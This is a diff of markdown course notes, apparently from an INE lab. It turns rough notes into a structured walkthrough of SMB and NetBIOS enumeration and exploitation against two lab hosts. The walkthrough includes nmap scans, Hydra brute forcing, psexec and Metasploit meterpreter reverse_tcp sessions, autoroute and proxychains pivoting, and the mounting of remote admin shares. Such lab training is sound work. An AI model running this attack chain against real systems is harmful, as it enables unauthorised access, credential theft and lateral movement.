@@ -60,169 +60,187 @@ nmap -Pn -sS -sV -p445,3389 -f --data-length 200 -D 10.10.23.1,10.10.23.2 [targe
 - Modern implementations of Windows primarily use SMB and can work without NetBIOS, however, NetBIOS over TCP 139 is required for backward compatibility and are often enabled together
 
 
-## Demo:
+# SMB & NetBIOS Enumeration and Exploitation
 
-`cat /etc/hosts`
+## Objective
 
-We can ping the first machine, but not the 2nd, because we need to pivot that machine.
+The objective of this exercise is to enumerate and exploit the SMB services on two target systems. Using tools such as `Nmap`, `Hydra`, `Metasploit`, and `Proxychains`, you will learn to identify and exploit vulnerabilities in SMB services. Additionally, the lab demonstrates pivoting techniques and how to mount shared drives in the target network.
 
-`nmap demo.ine.local`
+## Lab Environment
 
-We can see the netbios port, so we do netbios enumeration
+In this lab, you will access a Kali GUI instance. Two vulnerable SMB services are accessible via Kali tools at `http://demo.ine.local` and `http://demo1.ine.local`.
 
-`nbtscan`
+### Goal:
+Exploit both targets and find the flag!
 
-`whatis nbtscan`
+## Tools
 
-`nbtscan 10.2.21.216/24`
+The best tools for this lab are:
 
-We get the netBIOS names
+- `Metasploit Framework`
+- `Nmap`
+- `Hydra`
+- `Proxychains`
 
-`nmblookup -A `
+## SMB / NetBIOS Enumeration
 
-`cat /etc/hosts/`
+### What is NetBIOS?
+NetBIOS is an API and a set of network protocols that provide communication services over a local network.
 
-`nmblookup -A [demo.ine.local]`
+### Functions:
+- **Name Service (NetBIOS-NS):** Allows computers to register, unregister, and resolve names in a local network.
+- **Datagram Service (NetBIOS-DGM):** Supports connectionless communication and broadcasting.
+- **Session Service (NetBIOS-SSN):** Supports connection-oriented communication for more reliable data transfers.
 
-`nmap -sU -p 137 [demo.ine.local]`
+### Ports:
+NetBIOS typically uses ports 137 (Name Service), 138 (Datagram Service), and 139 (Session Service) over UDP and TCP.
 
-`nma -sU -sV -t4 --script nbstat.nse -p137 -Pn -n [demo.ine.local]`
+### What is SMB?
+SMB is a file-sharing protocol.
 
-We perform SMB enumeration:
+### Functions:
+SMB provides features for file and printer sharing, named pipes, and inter-process communication (IPC). It allows users to access files on remote computers as if they were local.
 
-`nmap -sV -p 139,445 demo.ine.local`
+### Versions:
+- **SMB 1.0:** The original version with known security vulnerabilities, used with older operating systems like Windows XP.
+- **SMB 2.0/2.1:** Introduced with Windows Vista/Windows Server 2008, offering improved performance and security.
+- **SMB 3.0+:** Introduced with Windows 8/Windows Server 2012, adding features like encryption, multichannel support, and improvements for virtualization.
 
-we utilize the nmap scripting engine to identify the smb protocol supported on this windows system. So we enumerate the versions of smb:
+### Ports:
+SMB generally uses port 445 for direct SMB traffic (bypassing NetBIOS) and port 139 when operating with NetBIOS.
 
-this are the options we have available:
+## SMB & NetBIOS Enumeration
 
-`ls -al /usr/share/nmap/scripts/ | grep -e "smb-*"`
+While NetBIOS and SMB were once closely linked, modern networks primarily rely on SMB for file and printer sharing, often using DNS and other mechanisms for name resolution instead of NetBIOS. Modern implementations of Windows mainly use SMB and can work without NetBIOS; however, NetBIOS over TCP 139 is often enabled for backward compatibility.
 
-`nmap -p445 --script smb-protocols demo.ine.local`
+### Demo:
 
-We see that the smb port is open, but we have ntlm (smb v1) and other verisons. So we identified what versions of smb is supported. So we take advantage of SMB v1. but before we do that, we want to identify the security level of smb:
+1. **Display the Hosts File:**
 
-`nmap -p45 --script smb-security-mode demo.ine.local`
+   `cat /etc/hosts`
 
-we test for specific vulnerability types for smbv1:
+   *Displays the hosts file to see which names and IP addresses are configured on the system.*
 
-`smbclient -L demo.ine.local`
+2. **Test Connectivity:**
 
-We hit enter because we try anonymous login. login successfully
+   `ping demo.ine.local`
 
-We can perform username enumeration on the windows system because of the anonymous windows login:
+   *Ping command to test the reachability of the first target.*
 
-`nmap -p445 --script smb-enum-users.nse [target IP]`
+3. **Network Scan:**
 
-We get username, passworts etc.
+   `nmap demo.ine.local`
 
-Now, we can leverage this information for brute-forcing smb
+   *Scan the target machine to identify open ports and services.*
 
-`vim users.txt`
+4. **NetBIOS Enumeration:**
 
-admin
-administrator
-root
-quit
+   `nbtscan`  
+   `whatis nbtscan`  
+   `nbtscan 10.2.21.216/24`
 
-`hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb`
+   *Use `nbtscan` to identify NetBIOS names in the network.*
 
-brute force is successful. 
+5. **Resolve NetBIOS Name:**
 
-`psexec.py administrator@demo.ine.local`
+   `nmblookup -A demo.ine.local`
 
-login
+   *`nmblookup` resolves the NetBIOS name and returns information about the target machine.*
 
-we get a session on the target
+6. **NetBIOS Port Scan:**
 
-we also try to get a metasploit meterpreter session:
+   `nmap -sU -p 137 demo.ine.local`
 
-`msfconsole -q`
+   *Scan the NetBIOS port to determine if the service is running.*
 
-`search psexec`
+7. **SMB Enumeration:**
 
-`use [module]`
+   `nmap -sV -p 139,445 demo.ine.local`
 
-evtl. set payload
+   *Scan the SMB ports (139, 445) to find out which SMB versions are supported on the system.*
 
-`set rhosts demo.ine.local`
+8. **Identify SMB Versions:**
 
-`set SMBuser Administrator`
+   `nmap -p 445 --script smb-protocols demo.ine.local`
 
-`set SMBPass password1`
+   *Identify the SMB versions supported on the target system.*
 
-`exploit`
+9. **Check SMB Security Mode:**
 
-we should a meterpreter session
+   `nmap -p 445 --script smb-security-mode demo.ine.local`
 
-`set payload windows/x64/meterpreter/reverse_tcp`
+   *Check the security mode of SMB to identify potential vulnerabilities.*
 
-`sysinfo`
+10. **Use SMB Client:**
 
-Now we want to gain access to the second system. We try to ping the demo2 from our current session on target1:
+    `smbclient -L demo.ine.local`
 
-meterpreter:`shell`
+    *Attempt an anonymous login to the SMB service to browse shared resources.*
 
-metepreter:`ping [target2]`
+11. **User Enumeration:**
 
-metepreter:`run autoroute -s [demo.ine.local/20`
+    `nmap -p 445 --script smb-enum-users.nse demo.ine.local`
 
-metepreter:`background`
+    *Enumerate users available on the SMB service.*
 
-We set up a proxy with metasploit proxy module:
+12. **Brute-Force SMB:**
 
-`cat /etc/proxychains4.conf`
+    `vim users.txt`
 
-metasploit psexec: `search socks`
+    *Create a `users.txt` file with usernames for brute-force attacks.*
 
-`use 0`
+    `hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb`
 
-`show options`
+    *Run `Hydra` to brute-force the SMB login using a wordlist.*
 
-`set version 4a`
+13. **Gain SMB Access:**
 
-`set SRVPORT 9050`: because thats configured
+    `psexec.py administrator@demo.ine.local`
 
-`exploit`
+    *Use `psexec` to obtain a shell on the target system.*
 
-on target0, we check `netstat -antp`
+14. **Start a Meterpreter Session:**
 
-`proxychains nmap demo1.ine.local -T -Pn -sV -p 445`
+    `msfconsole -q`  
+    `search psexec`  
+    `use [module]`  
+    `set payload windows/x64/meterpreter/reverse_tcp`  
+    `set rhosts demo.ine.local`  
+    `set SMBuser Administrator`  
+    `set SMBPass password1`  
+    `exploit`
 
-On the initial session, demo.ine.local, we check if we can interact with demo1.ine.local
+    *Use Metasploit to start a Meterpreter session on the target system.*
 
-`shell`
+15. **Attack the Second System:**
 
-`net view [demo1]`
+    `meterpreter:shell`  
+    `meterpreter:ping demo1.ine.local`  
+    `meterpreter:run autoroute -s demo.ine.local/20`  
+    `meterpreter:background`
 
-`background`
+    *Use the current session to scan and exploit the second target system.*
 
-meterpeter: `migrate -N explorer.exe`
+16. **Use Proxychains:**
 
-`shell`
+    `cat /etc/proxychains4.conf`
 
-`net view demo1`
+    *Configure Proxychains to connect to the second target system via the first target.*
 
-`net use D: \\[Demo1]\Documents`
+    `metasploit psexec: search socks`  
+    `use 0`  
+    `show options`  
+    `set version 4a`  
+    `set SRVPORT 9050`  
+    `exploit`  
+    `proxychains nmap demo1.ine.local -T4 -Pn -sV -p 445`
 
-`net use K: \\[Demo1]\K$`
+    *Use `Proxychains` to access and scan the second target through the first.*
 
-`dir`
+17. **Mount Shared Drives:**
 
-`dir K:\`
+    `net use D: \\[Demo1]\Documents`  
+    `net use K: \\[Demo1]\K$`  
+    `dir K:\`
 
-We were mapping the share drive into our demo, that allows us the content of the shares
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+    *Mount shared drives from the second target system onto the first to access files.*
